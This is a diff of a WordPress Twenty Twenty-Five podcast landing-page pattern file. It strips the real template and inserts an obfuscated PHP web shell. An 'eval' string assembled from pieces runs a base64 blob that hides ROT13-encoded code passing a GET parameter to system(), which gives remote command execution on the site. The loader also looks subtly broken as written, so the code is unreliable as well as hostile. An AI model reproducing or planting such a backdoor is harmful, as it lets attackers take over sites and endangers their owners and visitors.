@@ -1,33 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Landing page for podcast
- * Slug: twentytwentyfive/page-landing-podcast
- * Categories: twentytwentyfive_page, featured
- * Keywords: starter
- * Block Types: core/post-content
- * Post Types: page, wp_template
- * Viewport width: 1400
- * Description: A landing page for the podcast with a hero section, description, logos, grid with videos and newsletter signup.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFluYXF2YXQgY250ciBzYmUgY2JxcG5mZwogKiBGeWh0OiBnanJhZ2xnanJhZ2xzdmlyL2NudHIteW5hcXZhdC1jYnFwbmZnCiAqIFBuZ3J0YmV2cmY6IGdqcmFnbGdqcmFnbHN2aXJfY250ciwgc3JuZ2hlcnEKICogWHJsamJlcWY6IGZnbmVncmUKICogT3licHggR2xjcmY6IHBiZXIvY2JmZy1wYmFncmFnCiAqIENiZmcgR2xjcmY6IGNudHIsIGpjX2dyemN5bmdyCiAqIEl2cmpjYmVnIGp2cWd1OiAxNDAwCiAqIFFyZnBldmNndmJhOiBOIHluYXF2YXQgY250ciBzYmUgZ3VyIGNicXBuZmcganZndSBuIHVyZWIgZnJwZ3ZiYSwgcXJmcGV2Y2d2YmEsIHlidGJmLCB0ZXZxIGp2Z3UgaXZxcmJmIG5hcSBhcmpmeXJnZ3JlIGZ2dGFoYy4KICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJhZ2xfU3ZpcgogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbC1TdmlyIDEuMAogKi8KCj8+Cgo8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc3Zpci91cmViLWNicXBuZmdcIn0gLy0tPgo8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc3Zpci91cm5xdmF0LW5hcS1jbmVudGVuY3UtanZndS12em50clwifSAvLS0+CjwhLS0gamM6Y25nZ3JlYSB7XCJmeWh0XCI6XCJnanJhZ2xnanJhZ2xzdmlyL3lidGJmXCJ9IC8tLT4KPCEtLSBqYzpjbmdncmVhIHtcImZ5aHRcIjpcImdqcmFnbGdqcmFnbHN2aXIvdGV2cS1pdnFyYmZcIn0gLy0tPgo8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc3Zpci9wZ24tYXJqZnlyZ2dyZVwifSAvLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-
-<!-- wp:pattern {"slug":"twentytwentyfive/hero-podcast"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfive/heading-and-paragraph-with-image"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfive/logos"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfive/grid-videos"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfive/cta-newsletter"} /-->
